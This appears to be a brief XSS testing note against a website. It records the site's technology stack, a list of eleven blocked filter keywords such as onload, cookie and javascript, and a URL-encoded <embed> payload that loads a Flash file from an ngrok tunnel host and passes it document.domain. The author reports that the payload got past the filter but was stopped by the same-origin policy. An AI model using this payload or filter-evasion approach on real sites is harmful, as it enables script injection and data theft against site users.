https://www.example.com [Bootstrap:5.1.3,Font Awesome,Google Tag Manager,HTTP/3,LiteSpeed,PHP:5.6.40,YouTube]

Bunny CDN
jsDelivr
jQuery CDN

blocked characters:
1. onload
2. src
3. cookie
4. onclick
5. onerror
6. onstart
7. setTimeout
8. xlink
9. javascript
10. data
11. %

this got around, but got blocked by SOP:
```
<embed+codebase%3d"http%3a//4.tcp.eu.ngrok.io:18641/xss.swf%3fc%3d'%2bdocument.domain%3b"></embed>
```